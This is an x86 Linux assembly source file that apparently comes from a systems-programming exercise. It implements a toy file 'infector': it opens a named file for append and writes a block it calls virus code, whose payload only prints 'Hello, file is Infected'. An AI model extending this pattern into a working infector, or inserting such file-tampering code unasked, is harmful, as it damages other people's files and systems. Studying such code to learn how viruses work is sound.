section .rodata
    infectionMessage: db "Hello, file is Infected", 10
    len: equ $ - infectionMessage

section .text
global system_call
global infection
global infector

%define SYS_WRITE 4
%define STDOUT 1
%define SYS_OPEN 5
%define SYS_LSEEK 19
%define SEEK_END 2
%define SYS_CLOSE 6

; System call wrapper function
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save more caller state (registers)
    mov     eax, [ebp+8]    ; Copy function args to registers
    mov     ebx, [ebp+12]
    mov     ecx, [ebp+16]
    mov     edx, [ebp+20]
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; Place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

; Infection function to print message
infection:
    mov     eax, SYS_WRITE  ; sys_write
    mov     ebx, STDOUT     ; file descriptor stdout
    mov     ecx, infectionMessage  ; message address
    mov     edx, len        ; message length
    int     0x80            ; syscall
    ret

; Infector function to attach virus to a file
infector:
    ; Open file for append
    push    ebp
    mov     ebp, esp
    sub     esp, 4
    pushad

    xor     eax, eax        ; Clear eax
    mov     eax, SYS_OPEN   ; sys_open
    mov     ebx, [ebp+8]    ; filename
    mov     ecx, 0x401      ; O_WRONLY | O_APPEND
    int     0x80            ; syscall open
    test    eax, eax        ; Check if file descriptor is valid
    js      .error          ; If negative, handle error
    mov     edi, eax        ; store file descriptor

    ; Seek to the end of the file
    mov     eax, SYS_LSEEK  ; sys_lseek
    mov     ebx, edi        ; file descriptor
    xor     ecx, ecx        ; offset
    mov     edx, SEEK_END   ; SEEK_END
    int     0x80            ; syscall seek

    ; Write virus code to file
    mov     eax, SYS_WRITE  ; sys_write
    mov     ebx, edi        ; file descriptor
    mov     ecx, code_start ; virus code start address
    mov     edx, code_end - code_start  ; virus code length
    int     0x80            ; syscall write

    ; Close file
    mov     eax, SYS_CLOSE  ; sys_close
    mov     ebx, edi        ; file descriptor
    int     0x80            ; syscall close

    popad
    mov     esp, ebp
    pop     ebp
    ret

.error:
    ; Handle error (optional)
    popad
    mov     esp, ebp
    pop     ebp
    ret

section .data
code_start:
    ; Example virus code or payload
    mov     eax, SYS_WRITE  ; sys_write
    mov     ebx, STDOUT     ; file descriptor stdout
    mov     ecx, infectionMessage  ; message address
    mov     edx, len        ; message length
    int     0x80            ; syscall
code_end:
